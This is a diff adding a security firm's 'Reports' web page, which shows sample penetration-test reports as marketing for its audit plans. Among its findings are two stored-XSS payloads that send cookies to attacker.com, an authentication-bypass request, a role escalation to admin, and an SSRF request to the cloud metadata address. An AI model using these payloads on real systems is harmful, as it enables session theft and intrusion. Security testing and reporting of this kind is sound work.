@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+	<title>Reports - Yogsec</title>
+	<!--
+
+    Template 2106 Soft Landing
+
+	http://www.tooplate.com/view/2106-soft-landing
+
+    -->
+     <meta charset="UTF-8">
+     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+     <meta name="description" content="">
+     <meta name="keywords" content="">
+     <meta name="team" content="">
+     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+     <link rel="stylesheet" href="css/bootstrap.min.css">
+     <link rel="stylesheet" href="css/owl.carousel.css">
+     <link rel="stylesheet" href="css/owl.theme.default.min.css">
+     <link rel="stylesheet" href="css/font-awesome.min.css">
+
+     <!-- MAIN CSS -->
+     <link rel="stylesheet" href="css/tooplate-style.css">
+     
+
+</head>
+<body>
+
+    
+
+
+     <!-- PRE LOADER -->
+     <section class="preloader">
+          <div class="spinner">
+
+               <span class="spinner-rotate"></span>
+               
+          </div>
+     </section>
+
+  <!-- MENU -->
+     <section class="navbar custom-navbar navbar-fixed-top navbar-dark" style="background-color:#020617;" role="navigation">
+          <div class="container">
+
+               <div class="navbar-header">
+                    <button class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                         <span class="icon icon-bar"></span>
+                         <span class="icon icon-bar"></span>
+                         <span class="icon icon-bar"></span>
+                    </button>
+
+                    <!-- lOGO TEXT HERE -->
+                    <a href="index.html" class="navbar-brand">Yogsec</a>
+               </div>
+
+               <!-- MENU LINKS -->
+               <div class="collapse navbar-collapse">
+                    <ul class="nav navbar-nav">
+                         <li><a href="index.html" class="smoothScroll">Home</a></li>
+                         <li><a href="services.html" class="smoothScroll">Services</a></li>
+                                                  <li><a href="services.html" class="smoothScroll">Free audit</a></li>
+                         <li><a href="about.html" class="smoothScroll">About us</a></li>
+                         <li><a href="reports.html" class="smoothScroll">Reports</a></li>
+                         <li><a href="methodology.html" class="smoothScroll">Methodology</a></li>
+                         <li><a href="faq.html" class="smoothScroll">FAQ</a></li>
+                         <li><a href="contact.html" class="smoothScroll">Contact</a></li>                         
+                         
+                    </ul>
+                   
+               </div>
+
+          </div>
+     </section>
+    
+
+
+
+     
+
+    
+
+
+     
+     <section id="" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+              
+                    <section id="free-plan-sample-report">
+  <div class="container">
+
+    <h1>Free Website Security Health Check – Sample Report</h1>
+    <p>
+      This sample report demonstrates the depth and quality of vulnerabilities
+      identified during a <strong>Free Website Security Health Check</strong> by YogSec.
+      Even without intrusive testing, critical security risks can be detected
+      through expert analysis and passive techniques.
+    </p>
+
+    <hr />
+
+    <h2>Executive Summary</h2>
+    <ul>
+      <li><strong>Target Website:</strong> https://example.com</li>
+      <li><strong>Assessment Type:</strong> Free Security Health Check</li>
+      <li><strong>Testing Mode:</strong> Non-intrusive / Passive</li>
+      <li><strong>Overall Risk Level:</strong> <span style="color:red;">High</span></li>
+      <li><strong>Assessment Date:</strong> DD/MM/YYYY</li>
+    </ul>
+
+    <p>
+      The assessment identified multiple <strong>high-risk security weaknesses</strong>
+      that could potentially be exploited by attackers without authentication.
+      Immediate attention is recommended.
+    </p>
+
+    <hr />
+
+    <h2>High-Risk Findings Identified</h2>
+
+    <h3>1. Missing Critical Security Headers</h3>
+    <p><strong>Severity:</strong> High</p>
+    <p>
+      Several critical HTTP security headers are missing, exposing the website
+      to client-side attacks such as clickjacking, XSS, and data injection.
+    </p>
+    <ul>
+      <li>Content-Security-Policy (CSP)</li>
+      <li>X-Frame-Options</li>
+      <li>X-Content-Type-Options</li>
+      <li>Strict-Transport-Security (HSTS)</li>
+    </ul>
+    <p>
+      <strong>Impact:</strong> Attackers may inject malicious scripts,
+      trick users into interacting with hidden elements,
+      or downgrade secure connections.
+    </p>
+
+    <hr />
+
+    <h3>2. Weak SSL/TLS Configuration</h3>
+    <p><strong>Severity:</strong> High</p>
+    <p>
+      The SSL/TLS configuration allows outdated protocols and weak cipher suites,
+      making encrypted communication vulnerable to interception or downgrade attacks.
+    </p>
+    <ul>
+      <li>Outdated TLS versions enabled</li>
+      <li>Weak cipher suites supported</li>
+      <li>Improper certificate chain configuration</li>
+    </ul>
+    <p>
+      <strong>Impact:</strong> Sensitive data such as login credentials
+      and session cookies may be exposed to attackers on the network.
+    </p>
+
+    <hr />
+
+    <h3>3. Publicly Accessible Sensitive Endpoints</h3>
+    <p><strong>Severity:</strong> High</p>
+    <p>
+      Multiple sensitive endpoints were discovered to be publicly accessible
+      without authentication or access control.
+    </p>
+    <ul>
+      <li>Administrative paths exposed</li>
+      <li>Debug or test endpoints reachable</li>
+      <li>Unrestricted API routes discovered</li>
+    </ul>
+    <p>
+      <strong>Impact:</strong> Attackers may enumerate internal functionality,
+      gather sensitive information, or prepare targeted attacks.
+    </p>
+
+    <hr />
+
+    <h3>4. Insecure Cookie Configuration</h3>
+    <p><strong>Severity:</strong> Medium to High</p>
+    <p>
+      Cookies are missing important security attributes that help protect
+      against session hijacking and cross-site attacks.
+    </p>
+    <ul>
+      <li>Missing HttpOnly flag</li>
+      <li>Missing Secure flag</li>
+      <li>SameSite attribute not enforced</li>
+    </ul>
+    <p>
+      <strong>Impact:</strong> User sessions may be stolen through
+      client-side attacks or malicious third-party scripts.
+    </p>
+
+    <hr />
+
+    <h2>Risk Summary</h2>
+    <table border="1" cellpadding="8" cellspacing="0">
+      <thead>
+        <tr>
+          <th>Category</th>
+          <th>Issues Found</th>
+          <th>Risk Level</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Security Headers</td>
+          <td>4</td>
+          <td>High</td>
+        </tr>
+        <tr>
+          <td>SSL/TLS</td>
+          <td>3</td>
+          <td>High</td>
+        </tr>
+        <tr>
+          <td>Access Exposure</td>
+          <td>2</td>
+          <td>High</td>
+        </tr>
+        <tr>
+          <td>Session Security</td>
+          <td>3</td>
+          <td>Medium</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <hr />
+
+    <h2>Important Notes</h2>
+    <ul>
+      <li>No authentication was bypassed</li>
+      <li>No data was accessed or modified</li>
+      <li>No exploitation was performed</li>
+      <li>All findings were identified using passive analysis</li>
+    </ul>
+
+    <p>
+      The presence of high-risk findings during a free health check
+      strongly indicates the need for a <strong>full security audit</strong>.
+    </p>
+
+    <hr />
+
+    <h2>Recommended Next Step</h2>
+    <p>
+      To validate exploitability and identify deeper vulnerabilities
+      such as XSS, SQL Injection, authentication bypass, and business logic flaws,
+      a <strong>Full Website Security Audit</strong> is recommended.
+    </p>
+
+    <p>
+      <strong>Upgrade Recommendation:</strong><br />
+      🔐 Full Website Security Audit – Starting at $40
+    </p>
+
+  </div>
+</section>
+
+</br></br></br></br>
+
+<h1>YogSec – Business Plan Security Assessment Report</h1>
+<p><strong>Assessment Type:</strong> Manual + Automated Penetration Testing</p>
+<p><strong>Plan:</strong> Business Security Audit</p>
+<p><strong>Tested Assets:</strong> Web Application, API Endpoints, Authentication, Admin Panels</p>
+<p><strong>Testing Methodology:</strong> OWASP Top 10 + Real-World Attack Simulation</p>
+
+<div class="section">
+<h2>Executive Summary</h2>
+<p>
+This assessment demonstrates the depth of vulnerabilities identified under the <strong>YogSec Business Plan</strong>.
+Unlike basic scans, this plan includes <strong>manual exploitation, logic testing, chained attacks, and privilege escalation checks</strong>.
+</p>
+<p>
+Multiple <span class="severity-critical">Critical</span> and <span class="severity-high">High</span> severity vulnerabilities were discovered that could allow:
+</p>
+<ul>
+<li>Complete account takeover</li>
+<li>Unauthorized access to sensitive user data</li>
+<li>Admin privilege escalation</li>
+<li>Server-side compromise</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Key Findings Overview</h2>
+<ul>
+<li><span class="severity-critical">Critical</span> – Broken Access Control (IDOR + Privilege Escalation)</li>
+<li><span class="severity-critical">Critical</span> – Stored Cross-Site Scripting (Admin Context)</li>
+<li><span class="severity-high">High</span> – Authentication Bypass via Logic Flaw</li>
+<li><span class="severity-high">High</span> – Server-Side Request Forgery (SSRF)</li>
+<li><span class="severity-medium">Medium</span> – Insecure Token Handling</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Vulnerability 1: Broken Access Control (IDOR)</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p><strong>Description:</strong></p>
+<p>
+An Insecure Direct Object Reference (IDOR) vulnerability was discovered in the user account API.
+By modifying numeric identifiers, an attacker could access other users’ private data without authorization.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Access to PII (email, phone, address)</li>
+<li>Unauthorized data modification</li>
+<li>Possible account takeover</li>
+</ul>
+
+<p><strong>Example Request:</strong></p>
+<code>GET /api/user/profile?id=1021</code>
+
+<p><strong>Business Risk:</strong></p>
+<p>
+This vulnerability can lead to mass data leaks, legal penalties, and severe trust loss.
+</p>
+</div>
+
+<div class="section">
+<h2>Vulnerability 2: Stored XSS (Admin Execution)</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p><strong>Description:</strong></p>
+<p>
+User-controlled input was stored and later rendered inside the admin dashboard without sanitization.
+When an administrator viewed the affected page, attacker-controlled JavaScript executed automatically.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Admin session hijacking</li>
+<li>Malicious actions executed as admin</li>
+<li>Complete system compromise</li>
+</ul>
+
+<p><strong>Payload Example:</strong></p>
+<code>&lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;</code>
+</div>
+
+<div class="section">
+<h2>Vulnerability 3: Authentication Logic Bypass</h2>
+<p><strong>Severity:</strong> <span class="severity-high">High</span></p>
+<p>
+A logic flaw in the authentication workflow allowed login without proper password validation
+when specific request sequences were followed.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Login without valid credentials</li>
+<li>Account compromise</li>
+<li>Brute-force protection bypass</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Vulnerability 4: Server-Side Request Forgery (SSRF)</h2>
+<p><strong>Severity:</strong> <span class="severity-high">High</span></p>
+<p>
+The application fetched external URLs based on user input without validation,
+allowing attackers to force internal server requests.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Internal service discovery</li>
+<li>Cloud metadata exposure</li>
+<li>Internal admin access</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Security Recommendations</h2>
+<ul>
+<li>Implement strict server-side authorization checks</li>
+<li>Sanitize and encode all user inputs</li>
+<li>Enforce proper authentication workflows</li>
+<li>Restrict outbound server requests</li>
+<li>Apply least-privilege access controls</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Why This Matters for Your Business</h2>
+<p>
+This report demonstrates how YogSec’s <strong>Business Plan</strong> identifies vulnerabilities
+that automated scanners and basic audits miss.
+These issues represent <strong>real attacker pathways</strong> that could be exploited in production.
+</p>
+</div>
+
+
+</br></br></br></br>
+
+<h1>YogSec – Professional Penetration Testing Report</h1>
+
+<p><strong>Client:</strong> Confidential</p>
+<p><strong>Plan:</strong> Professional (Advanced Manual Pentesting)</p>
+<p><strong>Assessment Scope:</strong> Web App, APIs, Admin Panel, Authentication, Infrastructure</p>
+<p><strong>Testing Period:</strong> 7–14 Days</p>
+<p><strong>Methodology:</strong> OWASP Top 10, OWASP API Top 10, Real-World Adversary Simulation</p>
+
+<div class="section">
+<h2>Executive Summary</h2>
+<p>
+This report represents the highest level of security testing provided by <strong>YogSec Professional Plan</strong>.
+The assessment goes beyond vulnerability discovery and focuses on <strong>complete attack chains</strong>,
+demonstrating how an attacker could move from a low-privileged user to <strong>full system compromise</strong>.
+</p>
+
+<p>
+Multiple <span class="severity-critical">Critical</span> vulnerabilities were identified that allow:
+</p>
+<ul>
+<li>Complete Account Takeover</li>
+<li>Admin Panel Compromise</li>
+<li>Remote Code Execution</li>
+<li>Database Extraction</li>
+<li>Infrastructure Access</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Attack Chain Overview</h2>
+<ol>
+<li>Authentication Bypass</li>
+<li>Privilege Escalation to Admin</li>
+<li>Stored XSS → Admin Session Hijack</li>
+<li>Server-Side Request Forgery (SSRF)</li>
+<li>Remote Code Execution (RCE)</li>
+</ol>
+<p>
+This chained exploitation demonstrates how a real attacker could fully compromise the application.
+</p>
+</div>
+
+<div class="section">
+<h2>Vulnerability 1: Authentication Bypass</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p>
+A logic flaw in the authentication mechanism allowed attackers to bypass password verification
+by manipulating request parameters and session handling.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Login as any user</li>
+<li>Bypass MFA controls</li>
+<li>Unauthorized account access</li>
+</ul>
+
+<p><strong>Example:</strong></p>
+<code>POST /api/login { "email": "victim@domain.com", "verified": true }</code>
+</div>
+
+<div class="section">
+<h2>Vulnerability 2: Privilege Escalation to Admin</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p>
+After bypassing authentication, the application failed to enforce role-based authorization.
+The attacker could modify role identifiers and gain administrative privileges.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Admin dashboard access</li>
+<li>User management control</li>
+<li>Application configuration takeover</li>
+</ul>
+
+<p><strong>Example:</strong></p>
+<code>PATCH /api/user/role { "role": "admin" }</code>
+</div>
+
+<div class="section">
+<h2>Vulnerability 3: Stored XSS → Admin Session Hijacking</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p>
+A stored XSS vulnerability allowed JavaScript execution inside the admin panel.
+When chained with privilege escalation, this enabled persistent admin session hijacking.
+</p>
+
+<p><strong>Payload:</strong></p>
+<code>&lt;script&gt;new Image().src='https://attacker.com?c='+document.cookie&lt;/script&gt;</code>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Persistent admin compromise</li>
+<li>Malicious actions executed silently</li>
+<li>Full backend control</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Vulnerability 4: Server-Side Request Forgery (SSRF)</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p>
+The application allowed unrestricted server-side URL fetching.
+This was abused to access internal services and cloud metadata.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Internal service discovery</li>
+<li>Cloud credential exposure</li>
+<li>Infrastructure pivoting</li>
+</ul>
+
+<p><strong>Example:</strong></p>
+<code>http://169.254.169.254/latest/meta-data/</code>
+</div>
+
+<div class="section">
+<h2>Vulnerability 5: Remote Code Execution (RCE)</h2>
+<p><strong>Severity:</strong> <span class="severity-critical">Critical</span></p>
+<p>
+By chaining SSRF with a vulnerable internal service, YogSec achieved remote command execution
+on the application server.
+</p>
+
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Full server compromise</li>
+<li>Database exfiltration</li>
+<li>Malware installation</li>
+<li>Complete infrastructure takeover</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Business Impact</h2>
+<p>
+If exploited by a real attacker, these vulnerabilities could result in:
+</p>
+<ul>
+<li>Complete data breach</li>
+<li>Regulatory fines</li>
+<li>Service disruption</li>
+<li>Brand reputation damage</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Professional Remediation Guidance</h2>
+<ul>
+<li>Rebuild authentication and authorization logic</li>
+<li>Implement strict role-based access control (RBAC)</li>
+<li>Apply server-side input validation</li>
+<li>Restrict internal network access</li>
+<li>Conduct regular penetration testing</li>
+</ul>
+</div>
+
+<div class="section">
+<h2>Why Choose YogSec Professional Plan</h2>
+<p>
+This report proves that YogSec does not stop at surface-level findings.
+We simulate real attackers, build exploit chains,
+and expose the vulnerabilities that truly matter.
+</p>
+</div>
+
+
+                         </div>
+                    </div>
+                    
+            
+     </section> 
+
+
+   
+
+
+     <!-- FOOTER -->
+     <footer id="footer" data-stellar-background-ratio="0.5">
+          <div class="container">
+               <div class="row">
+
+                    <div class="copyright-text col-md-12 col-sm-12">
+                         <div class="col-md-6 col-sm-6">
+                              <p>Copyright &copy; 2026 yogsec:
+<a href="terms.html">Terms & Conditions</a> | 
+                				                				<a href="privacy.html">Privacy</a></p>
+                         </div>
+
+                         <div class="col-md-6 col-sm-6">
+                              <ul class="social-icon">
+                                   <li><a href="#" class="fa fa-facebook-square" attr="facebook icon"></a></li>
+                                   <li><a href="https://x.com/yogsec" class="fa fa-twitter"></a></li>
+                                   <li><a href="https://instagram.com/yogsec.io" class="fa fa-instagram"></a></li>
+                              </ul>
+                         </div>
+                    </div>
+
+               </div>
+          </div>
+     </footer>
+
+
+     <!-- SCRIPTS -->
+     <script src="js/jquery.js"></script>
+     <script src="js/bootstrap.min.js"></script>
+     <script src="js/jquery.stellar.min.js"></script>
+     <script src="js/owl.carousel.min.js"></script>
+     <script src="js/smoothscroll.js"></script>
+     <script src="js/custom.js"></script>
+
+</body>
+</html>
